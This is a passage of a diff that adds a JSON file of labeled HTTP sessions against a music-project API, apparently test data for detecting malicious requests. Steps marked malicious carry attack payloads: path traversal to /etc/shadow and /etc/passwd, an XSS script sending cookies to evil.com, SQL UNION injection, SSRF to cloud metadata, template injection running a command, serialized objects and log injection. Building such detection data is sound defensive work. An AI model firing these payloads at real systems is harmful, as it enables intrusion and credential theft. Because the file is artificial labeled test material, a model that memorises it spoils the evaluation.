+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess025-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj-foreign-888",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token25"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. The word foreign is only part of the id string."
+      },
+      {
+        "id": "sess025-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-25",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token25"
+        },
+        "body": null,
+        "note": "The designer returns to viewing their own project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess026",
+    "client_ip": "10.5.5.5",
+    "steps": [
+      {
+        "id": "sess026-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer26@example.com",
+          "password": "Password26!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess026-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token26"
+        },
+        "body": null,
+        "note": "The designer views projects."
+      },
+      {
+        "id": "sess026-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-26",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token26"
+        },
+        "body": null,
+        "note": "The designer checks project 26."
+      },
+      {
+        "id": "sess026-s04",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {
+          "User-Agent": "Mozilla/3.0 (compatible; Netscape/3.0)"
+        },
+        "body": null,
+        "note": "The client checks status using an old legacy browser."
+      }
+    ]
+  },
+  {
+    "session_id": "sess027",
+    "client_ip": "192.168.8.10",
+    "steps": [
+      {
+        "id": "sess027-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token27",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Privilege Test",
+          "role": "administrator"
+        },
+        "note": "The client passes an uncontracted privilege field in the body."
+      },
+      {
+        "id": "sess027-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer27@example.com",
+          "password": "Password27!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess027-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token27"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess027-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      }
+    ]
+  },
+  {
+    "session_id": "sess028",
+    "client_ip": "172.16.8.88",
+    "steps": [
+      {
+        "id": "sess028-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer28@example.com",
+          "password": "Password28!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess028-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token28"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess028-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/projects/../../etc/shadow",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token28"
+        },
+        "body": null,
+        "note": "The client attempts directory traversal to sensitive system files."
+      },
+      {
+        "id": "sess028-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-28",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token28"
+        },
+        "body": null,
+        "note": "The designer returns to normal project viewing."
+      }
+    ]
+  },
+  {
+    "session_id": "sess029",
+    "client_ip": "10.22.33.44",
+    "steps": [
+      {
+        "id": "sess029-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer29@example.com",
+          "password": "Password29!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess029-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token29"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess029-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects/proj-29/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token29",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "trackName": "Vinyl's Master",
+          "durationSeconds": 240
+        },
+        "note": "The client uses an apostrophe in the track name."
+      },
+      {
+        "id": "sess029-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-29/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token29"
+        },
+        "body": null,
+        "note": "The designer views track listings."
+      }
+    ]
+  },
+  {
+    "session_id": "sess030",
+    "client_ip": "192.168.12.34",
+    "steps": [
+      {
+        "id": "sess030-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer30@example.com",
+          "password": "Password30!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess030-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token30"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess030-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/tracks/trk-30/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token30",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "<img src=x onerror=alert(document.cookie)>"
+        },
+        "note": "The client attempts browser-executed code injection in mastering notes."
+      },
+      {
+        "id": "sess030-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/tracks/trk-30/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token30"
+        },
+        "body": null,
+        "note": "The designer views notes."
+      }
+    ]
+  },
+  {
+    "session_id": "sess031",
+    "client_ip": "10.33.44.55",
+    "steps": [
+      {
+        "id": "sess031-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer31@example.com",
+          "password": "Password31!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess031-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token31"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess031-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token31",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "SSRF Test",
+          "description": "http://169.254.169.254/latest/meta-data/"
+        },
+        "note": "The client injects an internal cloud metadata address inside the description."
+      },
+      {
+        "id": "sess031-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-31",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token31"
+        },
+        "body": null,
+        "note": "The designer views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess032",
+    "client_ip": "192.168.20.10",
+    "steps": [
+      {
+        "id": "sess032-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer32@example.com",
+          "password": "Password32!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess032-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token32"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess032-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-32",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token32"
+        },
+        "body": null,
+        "note": "The designer views project 32."
+      },
+      {
+        "id": "sess032-s04",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj-32/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token32",
+          "X-Info": "Discussing cross-site scripting theoretically in header."
+        },
+        "body": null,
+        "note": "The client mentions a security term in a header."
+      }
+    ]
+  },
+  {
+    "session_id": "sess033",
+    "client_ip": "172.28.12.5",
+    "steps": [
+      {
+        "id": "sess033-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token33",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "${T(java.lang.Runtime).getRuntime().exec('id')}",
+          "description": "Template injection payload"
+        },
+        "note": "The client injects a template expression execution payload."
+      },
+      {
+        "id": "sess033-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer33@example.com",
+          "password": "Password33!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess033-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token33"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess033-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      }
+    ]
+  },
+  {
+    "session_id": "sess034",
+    "client_ip": "10.44.55.66",
+    "steps": [
+      {
+        "id": "sess034-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer34@example.com",
+          "password": "Password34!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess034-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token34"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess034-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token34",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Object Stream",
+          "description": "aced0005737200116a617661..."
+        },
+        "note": "The client submits a serialized object hex payload."
+      },
+      {
+        "id": "sess034-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-34",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token34"
+        },
+        "body": null,
+        "note": "The designer views project 34."
+      }
+    ]
+  },
+  {
+    "session_id": "sess035",
+    "client_ip": "192.168.25.50",
+    "steps": [
+      {
+        "id": "sess035-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer35@example.com",
+          "password": "Password35!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess035-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token35"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess035-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects/proj-35/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token35",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "trackName": "Normal Song\n[ERROR] 2026-03-30 14:22:01 Unauthorized access attempt logged.",
+          "durationSeconds": 210
+        },
+        "note": "The client injects a log stamp with a newline."
+      },
+      {
+        "id": "sess035-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-35/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token35"
+        },
+        "body": null,
+        "note": "The designer lists tracks for project 35."
+      }
+    ]
+  },
+  {
+    "session_id": "sess036",
+    "client_ip": "172.31.20.10",
+    "steps": [
+      {
+        "id": "sess036-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer36@example.com",
+          "password": "Password36!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess036-s02",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token36",
+          "X-Note": "User request note\nwith a continued sentence on the next line."
+        },
+        "body": null,
+        "note": "The client includes a header with a newline sentence continuation."
+      },
+      {
+        "id": "sess036-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-36",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token36"
+        },
+        "body": null,
+        "note": "The designer views project 36."
+      },
+      {
+        "id": "sess036-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-36/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token36"
+        },
+        "body": null,
+        "note": "The designer views tracks."
+      }
+    ]
+  },
+  {
+    "session_id": "sess037",
+    "client_ip": "10.60.70.80",
+    "steps": [
+      {
+        "id": "sess037-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token37",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Union Select",
+          "description": "' UNION SELECT username, password FROM users --"
+        },
+        "note": "The client performs a SQL union query injection attack."
+      },
+      {
+        "id": "sess037-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer37@example.com",
+          "password": "Password37!"
+        },
+        "note": "The designer authenticates."
+      },
+      {
+        "id": "sess037-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token37"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess037-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      }
+    ]
+  },
+  {
+    "session_id": "sess038",
+    "client_ip": "192.168.30.40",
+    "steps": [
+      {
+        "id": "sess038-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer38@example.com",
+          "password": "Password38!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess038-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token38"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess038-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj-foreign-999",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token38"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. The word foreign is only part of the id string."
+      },
+      {
+        "id": "sess038-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-38",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token38"
+        },
+        "body": null,
+        "note": "The designer returns to their own project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess039",
+    "client_ip": "172.16.50.15",
+    "steps": [
+      {
+        "id": "sess039-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer39@example.com",
+          "password": "Password39!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess039-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token39"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess039-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token39",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Electronica EP",
+          "description": "Dance mix",
+          "tag": "ambient_soundtrack"
+        },
+        "note": "The client includes a harmless extra metadata field."
+      },
+      {
+        "id": "sess039-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-39",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token39"
+        },
+        "body": null,
+        "note": "The designer views project 39."
+      }
+    ]
+  },
+  {
+    "session_id": "sess040",
+    "client_ip": "10.70.80.90",
+    "steps": [
+      {
+        "id": "sess040-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer40@example.com",
+          "password": "Password40!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess040-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token40"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess040-s03",
+        "label": "malicious",
+        "method": "PUT",
+        "path": "/projects/proj-40",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token40",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Project Updated",
+          "is_superuser": true
+        },
+        "note": "The client passes an uncontracted privilege field in project update."
+      },
+      {
+        "id": "sess040-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-40",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token40"
+        },
+        "body": null,
+        "note": "The designer views project 40 details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess041",
+    "client_ip": "192.168.40.50",
+    "steps": [
+      {
+        "id": "sess041-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer41@example.com",
+          "password": "Password41!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess041-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token41"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess041-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/projects/../../../../etc/passwd",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token41"
+        },
+        "body": null,
+        "note": "The client attempts directory traversal attack."
+      },
+      {
+        "id": "sess041-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system status."
+      }
+    ]
+  },
+  {
+    "session_id": "sess042",
+    "client_ip": "172.20.30.40",
+    "steps": [
+      {
+        "id": "sess042-s01",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json",
+          "User-Agent": "Mozilla/4.7 (compatible;)"
+        },
+        "body": {
+          "email": "designer42@example.com",
+          "password": "Password42!"
+        },
+        "note": "The client logs in using an old Netscape-era browser user agent."
+      },
+      {
+        "id": "sess042-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token42"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess042-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-42",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token42"
+        },
+        "body": null,
+        "note": "The designer views project 42."
+      },
+      {
+        "id": "sess042-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-42-sub",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token42"
+        },
+        "body": null,
+        "note": "The designer checks a secondary owned project ID."
+      }
+    ]
+  },
+  {
+    "session_id": "sess043",
+    "client_ip": "10.80.90.100",
+    "steps": [
+      {
+        "id": "sess043-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer43@example.com",
+          "password": "Password43!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess043-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token43"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess043-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/tracks/trk-43/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token43",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "<script>fetch('http://evil.com/'+document.cookie)</script>"
+        },
+        "note": "The client attempts XSS cookie exfiltration via mastering notes."
+      },
+      {
+        "id": "sess043-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/tracks/trk-43/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token43"
+        },
+        "body": null,
+        "note": "The designer views notes."
+      }
+    ]
+  },
+  {
+    "session_id": "sess044",
+    "client_ip": "192.168.50.60",
+    "steps": [
+      {
+        "id": "sess044-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer44@example.com",
+          "password": "Password44!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess044-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token44"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess044-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token44",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "SSRF Target",
+          "description": "http://10.0.0.1:80/admin"
+        },
+        "note": "The client attempts an internal network SSRF attack."
+      },
+      {
+        "id": "sess044-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      }
+    ]
+  },
+  {
+    "session_id": "sess045",
+    "client_ip": "172.16.60.20",
+    "steps": [
+      {
+        "id": "sess045-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer45@example.com",
+          "password": "Password45!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess045-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token45"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess045-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects/proj-45/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token45",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "trackName": "Track's Intro",
+          "durationSeconds": 150
+        },
+        "note": "The client includes an apostrophe in the track name."
+      },
+      {
+        "id": "sess045-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-45/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token45"
+        },
+        "body": null,
+        "note": "The designer views track lists."
+      }
+    ]
+  },
+  {
+    "session_id": "sess046",
+    "client_ip": "10.90.100.10",
+    "steps": [
+      {
+        "id": "sess046-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token46",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "${7*${7*7}}",
+          "description": "Nested template evaluation"
+        },
+        "note": "The client injects a nested template injection payload."
+      },
+      {
+        "id": "sess046-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer46@example.com",
+          "password": "Password46!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess046-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token46"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess046-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system status."
+      }
+    ]
+  },
+  {
+    "session_id": "sess047",
+    "client_ip": "192.168.60.70",
+    "steps": [
+      {
+        "id": "sess047-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer47@example.com",
+          "password": "Password47!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess047-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token47"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess047-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token47",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Serialized Payload 2",
+          "description": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hc..."
+        },
+        "note": "The client posts a serialized object payload."
+      },
+      {
+        "id": "sess047-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-47",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token47"
+        },
+        "body": null,
+        "note": "The designer views project 47."
+      }
+    ]
+  },
+  {
+    "session_id": "sess048",
+    "client_ip": "172.22.40.50",
+    "steps": [
+      {
+        "id": "sess048-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer48@example.com",
+          "password": "Password48!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess048-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token48"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess048-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects/proj-48/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token48",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "trackName": "Normal Track\n[CRITICAL] 2026-03-30 15:00:00 Log injection detected.",
+          "durationSeconds": 190
+        },
+        "note": "The client injects a log stamp with a newline."
+      },
+      {
+        "id": "sess048-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-48/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token48"
+        },
+        "body": null,
+        "note": "The designer views tracks."
+      }
+    ]
+  },
+  {
+    "session_id": "sess049",
+    "client_ip": "10.100.10.20",
+    "steps": [
+      {
+        "id": "sess049-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer49@example.com",
+          "password": "Password49!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess049-s02",
+        "suspicious_benign": true,
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token49",
+          "X-Note": "Mentioning SQL injection concept in header."
+        },
+        "body": null,
+        "note": "The client mentions a technical word in a request header."
+      },
+      {
+        "id": "sess049-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-49",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token49"
+        },
+        "body": null,
+        "note": "The designer views project 49."
+      },
+      {
+        "id": "sess049-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-49/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token49"
+        },
+        "body": null,
+        "note": "The designer views project tracks."
+      }
+    ]
+  },
+  {
+    "session_id": "sess050",
+    "client_ip": "192.168.70.80",
+    "steps": [
+      {
+        "id": "sess050-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer50@example.com",
+          "password": "Password50!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess050-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token50"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess050-s03",
+        "label": "benign",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token50",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Vinyl Masterpiece",
+          "description": "High fidelity audio"
